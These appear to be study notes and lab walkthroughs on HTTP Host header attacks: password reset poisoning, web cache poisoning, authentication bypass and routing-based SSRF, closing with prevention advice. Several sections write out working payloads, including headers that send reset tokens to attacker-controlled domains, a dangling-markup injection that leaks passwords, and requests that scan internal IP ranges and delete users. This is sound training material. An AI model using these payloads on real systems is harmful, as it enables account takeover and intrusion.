# HTTP Host header attacks

HTTP Host header is to help identify which back-end component the client wants to communicate with.

# Password reset poisoning

An attacker manipulates a vulnerable website into generating a password reset link pointing to a domain under their control. This behavior can be leveraged to steal the secret tokens required to reset arbitrary users' passwords and, ultimately, compromise their accounts.

## How does a password reset work?

1. The user enters their username or email address and submits a password reset request.
2. The website checks that this user exists and then generates a temporary, unique, high-entropy token, which it associates with the user's account on the back-end.
3. The website sends an email to the user that contains a link for resetting their password. The user's unique reset token is included as a query parameter in the corresponding URL:

    ```https://normal-website.com/reset?token=0a1b2c3d4e5f6g7h8i9j```

4. When the user visits this URL, the website checks whether the provided token is valid and uses it to determine which account is being reset. If everything is as expected, the user is given the option to enter a new password. Finally, the token is destroyed.

This process is simple enough and relatively secure in comparison to some other approaches. However, its security relies on the principle that only the intended user has access to their email inbox and, therefore, to their unique token. Password reset poisoning is a method of stealing this token in order to change another user's password.

## How to construct a password reset poisoning attack

If the URL that is sent to the user is dynamically generated based on controllable input, such as the Host header, it may be possible to construct a password reset poisoning attack as follows:

1. The attacker obtains the victim's email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the Host header so that it points to a domain that they control. For this example, we'll use *evil-user.net*.
2. The victim receives a genuine password reset email directly from the website. This seems to contain an ordinary link to reset their password and, crucially, contains a valid password reset token that is associated with their account. However, the domain name in the URL points to the attacker's server:

    ```https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j```

3. If the victim clicks this link (or it is fetched in some other way, for example, by an antivirus scanner) the password reset token will be delivered to the attacker's server.
4. The attacker can now visit the real URL for the vulnerable website and supply the victim's stolen token via the corresponding parameter. They will then be able to reset the user's password to whatever they like and subsequently log in to their account.

### Basic password reset poisoning

This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

**Solution**

1. Go to the login page and notice the "Forgot your password?" functionality. Request a password reset for your own account.
2. Go to the exploit server and open the email client. Observe that you have received an email containing a link to reset your password. Notice that the URL contains the query parameter *temp-forgot-password-token*.
3. Click the link and observe that you are prompted to enter a new password. Reset your password to whatever you want.
4. In Burp, study the HTTP history. Notice that the POST */forgot-password* request is used to trigger the password reset email. This contains the username whose password is being reset as a body parameter. Send this request to Burp Repeater.
5. In Burp Repeater, observe that you can change the Host header to an arbitrary value and still successfully trigger a password reset. Go back to the email server and look at the new email that you've received. Notice that the URL in the email contains your arbitrary Host header instead of the usual domain name.
6. Back in Burp Repeater, change the Host header to your exploit server's domain name (*your-exploit-server-id.web-security-academy.net*) and change the username parameter to carlos. Send the request.
7. Go to your exploit server and open the access log. You will see a request for *GET /forgot-password* with the *temp-forgot-password-token* parameter containing Carlos's password reset token. Make a note of this token.

    *Wx7VE39hO4yYjvwe3Kjt1rUvcbMCabVa*

8. Go to your email client and copy the genuine password reset URL from your first email. Visit this URL in the browser, but replace your reset token with the one you obtained from the access log.

    ```https://ac051fc21f83e78bc032180a00c1009d.web-security-academy.net/forgot-password?temp-forgot-password-token=Wx7VE39hO4yYjvwe3Kjt1rUvcbMCabVa```

9. Change Carlos's password to whatever you want, then log in as *carlos* to solve the lab.

### Password reset poisoning via middleware

This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

**Solution**

1. With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.
2. Send the *POST /forgot-password* request to Burp Repeater. Notice that the *X-Forwarded-Host* header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.
3. Go to the exploit server and make a note of your exploit server URL.
4. Go back to the request in Burp Repeater and add the *X-Forwarded-Host* header with your exploit server URL:

    ```X-Forwarded-Host: your-exploit-server-id.web-security-academy.net```

5. Change the *username* parameter to carlos and send the request.
6. Go to the exploit server and open the access log. You should see a *GET /forgot-password* request, which contains the victim's token as a query parameter. Make a note of this token.
7. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into the browser and change the value of the *temp-forgot-password-token* parameter to the value that you stole from the victim.
8. Load this URL and set a new password for Carlos's account.
9. Log in to Carlos's account using the new password to solve the lab.

### Password reset poisoning via dangling markup

This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.

**Solution**

1. Go to the login page and request a password reset for your own account.
2. Go to the exploit server and open the email client to find the password reset email. Observe that the link in the email simply points to the generic login page and the URL does not contain a password reset token. Instead, a new password is sent directly in the email body text.
3. In the proxy history, study the response to the *GET /email* request. Observe that the HTML content for your email is written to a string, but this is being sanitized using the *DOMPurify* library before it is rendered by the browser.
4. In the email client, notice that you have the option to view each email as raw HTML instead. Unlike the rendered version of the email, this does not appear to be sanitized in any way.
5. Send the *POST /forgot-password* request to Burp Repeater. Observe that tampering with the domain name in the Host header results in a server error. However, you are able to add an arbitrary, non-numeric port to the Host header and still reach the site as normal. Sending this request will still trigger a password reset email:

    ```Host: your-lab-id.web-security-academy.net:arbitraryport```

6. In the email client, check the raw version of your emails. Notice that your injected port is reflected inside a link as an unescaped, single-quoted string. This is later followed by the new password.
7. Send the *POST /forgot-password* request again, but this time use the port to break out of the string and inject a dangling-markup payload pointing to your exploit server:

    ```Host: your-lab-id.web-security-academy.net:'<a href="//your-exploit-server-id.web-security-academy.net/?```

    ```Host: acc81f231fbdfd6bc08930b1003700eb.web-security-academy.net:'<a href="//exploit-ac931fde1f85fd00c0a03047014700ab.web-security-academy.net/?```

8. Check the email client. You should have received a new email in which most of the content is missing. Go to the exploit server and check the access log. Notice that there is an entry for a request that begins *GET /?/login'>[…]*, which contains the rest of the email body, including the new password.
9. In Burp Repeater, send the request one last time, but change the username parameter to *carlos*. Refresh the access log and obtain Carlos's new password from the corresponding log entry.
10. Log in as *carlos* using this new password to solve the lab.

## Web cache poisoning via the Host header

 For example, you may find that the Host header is reflected in the response markup without HTML-encoding, or even used directly in script imports.

 However, if the target uses a web cache, it may be possible to turn this useless, reflected vulnerability into a dangerous, stored one by persuading the cache to serve a poisoned response to other users.

To construct a web cache poisoning attack, you need to elicit a response from the server that reflects an injected payload. The challenge is to do this while preserving a cache key that will still be mapped to other users' requests. If successful, the next step is to get this malicious response cached. It will then be served to any users who attempt to visit the affected page.

### Web cache poisoning via ambiguous requests

This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.

To solve the lab, poison the cache so the home page executes *alert(document.cookie)* in the victim's browser.

**Solution**

1. Send the *GET /* request that received a 200 response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header. After tampering with it, you are unable to still access the home page.
2. In the original response, notice the verbose caching headers, which tell you when you get a cache hit and how old the cached response is. Add an arbitrary query parameter to your requests to serve as a cache buster, for example, *GET /?cb=123*. You can simply change this parameter each time you want a fresh response from the back-end server.
3. Notice that if you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from */resources/js/tracking.js*.
4. Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.
5. Go to the exploit server and create a file at */resources/js/tracking.js* containing the payload *alert(document.cookie)*. Store the exploit and copy the domain name for your exploit server.
6. Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:

    ```
    GET /?cb=123 HTTP/1.1
    Host: your-lab-id.web-security-academy.net
    Host: your exploit-server-id.web-security-academy.net
    ```

7. Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the *alert()* fires.
8. In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page.

## Web cache poisoning

If a server had to send a new response to every single HTTP request separately, this would likely overload the server, resulting in latency issues and a poor user experience, especially during busy periods. Caching is primarily a means of reducing such issues.

The cache sits between the server and the user, where it saves (caches) the responses to particular requests, usually for a fixed amount of time. If another user then sends an equivalent request, the cache simply serves a copy of the cached response directly to the user, without any interaction from the back-end. This greatly eases the load on the server by reducing the number of duplicate requests it has to handle.

## Exploiting classic server-side vulnerabilities

Every HTTP header is a potential vector for exploiting classic server-side vulnerabilities, and the Host header is no exception. For example, you should try the usual SQL injection probing techniques via the Host header. If the value of the header is passed into a SQL statement, this could be exploitable.

## Accessing restricted functionality

Some websites' access control features make flawed assumptions that allow you to bypass these restrictions by making simple modifications to the Host header. This can expose an increased attack surface for other exploits.

### Host header authentication bypass

This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

**Solution**

1. Send the *GET /* request that received a 200 response to Burp Repeater. Notice that you can change the Host header to an arbitrary value and still successfully access the home page.
2. Browse to */robots.txt* and observe that there is an admin panel at */admin*.
3. Try and browse to */admin*. You do not have access, but notice the error message, which reveals that the panel can be accessed by local users.
4. Send the *GET /admin* request to Burp Repeater.
5. In Burp Repeater, change the Host header to localhost and send the request. Observe that you have now successfully accessed the admin panel, which provides the option to delete different users.
6. Change the request line to *GET /admin/delete?username=carlos* and send the request to delete Carlos and solve the lab.

## Accessing internal websites with virtual host brute-forcing

Companies sometimes make the mistake of hosting publicly accessible websites and private, internal sites on the same server. Servers typically have both a public and a private IP address. As the internal hostname may resolve to the private IP address, this scenario can't always be detected simply by looking at DNS records:

```
www.example.com: 12.34.56.78
intranet.example.com: 10.0.0.132
```

## Routing-based SSRF

It is sometimes also possible to use the Host header to launch high-impact, routing-based SSRF attacks. These are sometimes known as "Host header SSRF attacks".

### Routing-based SSRF

This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address.

To solve the lab, access the internal admin panel located in the *192.168.0.0/24* range, then delete Carlos.

**Solution**

1. Send the *GET /* request that received a 200 response to Burp Repeater.
2. From the Burp menu, open the Burp Collaborator client. In the dialog, click "Copy to clipboard" to copy your Burp Collaborator domain name. Leave the dialog open for now.
3. In Burp Repeater, replace the Host header value with your Collaborator domain name and send the request.
4. Go back to the Collaborator client dialog and click "Poll now". You should see a couple of network interactions in the table, including an HTTP request. This confirms that you are able to make the website's middleware issue requests to an arbitrary server. You can now close the Collaborator client.
5. Send the *GET /* request to Burp Intruder. In Burp Intruder, go to the "Positions" tab and clear the default payload positions. Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet:

    ```Host: 192.168.0.§0§```

6. On the "Payloads" tab, select the payload type "Numbers". Under "Payload Options", enter the following values:

    ```
    From: 0
    To: 255
    Step: 1
    ```

7. Click "Start attack". A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.
8. When the attack finishes, click the "Status" column to sort the results. Notice that a single request received a 302 response redirecting you to */admin*. Send this request to Burp Repeater.
9. In Burp Repeater, change the request line to *GET /admin* and send the request. In the response, observe that you have successfully accessed the admin panel.
10. Study the form for deleting users. Notice that it will generate a POST request to */admin/delete* with both a CSRF token and *username* parameter. You need to manually craft an equivalent request to delete Carlos.
11. Change the path in your request to */admin/delete*. Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing *carlos*. The request line should now look like this but with a different CSRF token:

    ```GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos```

12. Copy the session cookie from the *Set-Cookie* header in the displayed response and add it to your request.
13. Right-click on your request and select "Change request method". Burp will convert it to a *POST* request.
14. Send the request to delete Carlos and solve the lab.

### SSRF via flawed request parsing

This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.

To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos.

**Solution**

1. Send the *GET /* request that received a 200 response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header and blocks any requests in which it has been modified.
2. Observe that you can also access the home page by supplying an absolute URL in the request line as follows:

    ```GET https://your-lab-id.web-security-academy.net/```

3. Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header.
4. Use Burp Collaborator client to confirm that you can make the website's middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server:

    ```
    GET https://your-lab-id.web-security-academy.net/
    Host: BURP-COLLABORATOR-SUBDOMAIN
    ```

5. Send the request containing the absolute URL to Burp Intruder. Use the Host header to scan the IP range *192.168.0.0/24* to identify the IP address of the admin interface. Send this request to Burp Repeater.
6. In Burp Repeater, append */admin* to the absolute URL in the request line and send the request. Observe that you now have access to the admin panel, including a form for deleting users.
7. Change the absolute URL in your request to point to */admin/delete*. Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos. The request line should now look like this but with a different CSRF token:

    ```GET https://your-lab-id.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos```

8. Copy the session cookie from the *Set-Cookie* header in the displayed response and add it to your request.
9. Right-click on your request and select "Change request method". Burp will convert it to a *POST* request.
10. Send the request to delete Carlos and solve the lab.

## SSRF via a malformed request line

Custom proxies sometimes fail to validate the request line properly, which can allow you to supply unusual, malformed input with unfortunate results.

For example, a reverse proxy might take the path from the request line, prefix it with *http://backend-server*, and route the request to that upstream URL. This works fine if the path starts with a */* character, but what if starts with an @ character instead?

```GET @private-intranet/example HTTP/1.1```

The resulting upstream URL will be *http://backend-server@private-intranet/example*, which most HTTP libraries interpret as a request to access private-intranet with the username *backend-server*.

## How to prevent HTTP Host header attacks

To prevent HTTP Host header attacks, the simplest approach is to avoid using the Host header altogether in server-side code.

### Protect absolute URLs

When you have to use absolute URLs, you should require the current domain to be manually specified in a configuration file and refer to this value instead of the Host header. This approach would eliminate the threat of password reset poisoning, for example.

### Validate the Host header

The Django framework provides the ALLOWED_HOSTS option in the settings file. This approach will reduce your exposure to Host header injection attacks.

### Don't support Host override headers

It is also important to check that you do not support additional headers that may be used to construct these attacks, in particular X-Forwarded-Host. Remember that these may be supported by default.

### Whitelist permitted domains

To prevent routing-based attacks on internal infrastructure, you should configure your load balancer or any reverse proxies to forward requests only to a whitelist of permitted domains.

### Be careful with internal-only virtual hosts

When using virtual hosting, you should avoid hosting internal-only websites and applications on the same server as public-facing content. Otherwise, attackers may be able to access internal domains via Host header manipulation.